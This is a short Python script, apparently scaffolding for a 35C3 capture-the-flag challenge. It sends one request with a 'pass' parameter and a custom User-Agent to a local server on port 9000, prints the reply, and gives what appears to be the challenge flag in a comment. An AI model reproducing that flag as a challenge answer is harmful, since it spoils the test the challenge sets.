import requests, string
import _md5

url = "http://127.0.0.1:9000/"

response = requests.get(url+"?pass=b", headers={'User-Agent': "b"})
print(response.text)

# 35c3_password_saltf1sh_30_seconds_max
